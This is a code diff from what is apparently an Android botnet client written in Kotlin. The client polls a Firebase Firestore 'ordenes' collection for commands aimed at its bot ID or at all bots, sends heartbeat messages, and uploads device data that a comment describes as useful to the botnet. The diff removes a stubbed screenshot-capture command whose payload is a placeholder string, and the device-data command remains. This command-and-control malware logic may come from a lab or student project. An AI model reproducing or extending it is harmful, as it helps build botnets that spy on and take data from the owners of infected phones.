@@ -74,16 +74,6 @@ class Alarm : BroadcastReceiver() {
             .addOnSuccessListener { result ->
                 for (document in result) {
                     if (document.data["Bot_ID"]!!.equals(idAndroid) || document.data["Bot_ID"]!!.equals("todos")) {
-                        if (document.data["Primitiva"]!!.equals("CAPTURA")) {
-                            nuevaCaptura(db, strDate)
-                            Log.d("TAG2", "Se añade nueva captura")
-                            if(!(document.data["Bot_ID"]!!.equals("todos"))) {
-                                db.collection("ordenes").document(document.id).delete()
-                                    .addOnSuccessListener {
-                                        Log.d("TAG2", "Orden de captura eliminada")
-                                    }
-                            }
-                        }
                         if (document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")) {
                             nuevosDatosDispositivo(db, strDate)
                             Log.d("TAG2", "Se añade nuevos datos del dispositivo")
@@ -170,31 +160,6 @@ class Alarm : BroadcastReceiver() {
         Log.d("TAG2","Se ha enviado un nuevo mensaje de ImAlive")
     }
 
-    fun nuevaCaptura(db : FirebaseFirestore, strDate: String){
-
-        val captura = hashMapOf(
-            "Bot_ID" to idAndroid,
-            "Hora" to strDate,
-            "Captura" to "Esto sería una captura de pantalla"
-        )
-        db.collection("ordenes")
-            .whereEqualTo("Primitiva", "CAPTURA")
-            .addSnapshotListener { snapshot, e ->
-                if (e != null) {
-                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
-                    return@addSnapshotListener
-                }
-
-                for (dc in snapshot!!.documentChanges) {
-                    when (dc.type) {
-                        DocumentChange.Type.ADDED -> db.collection("capturas").document(idAndroid).set(captura)
-                    }
-                }
-
-            }
-
-        Log.d("TAG2","Se ha ejecutado la tarea de toma de captura de pantalla")
-    }
 
     fun nuevosDatosDispositivo(db : FirebaseFirestore, strDate: String){
         // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
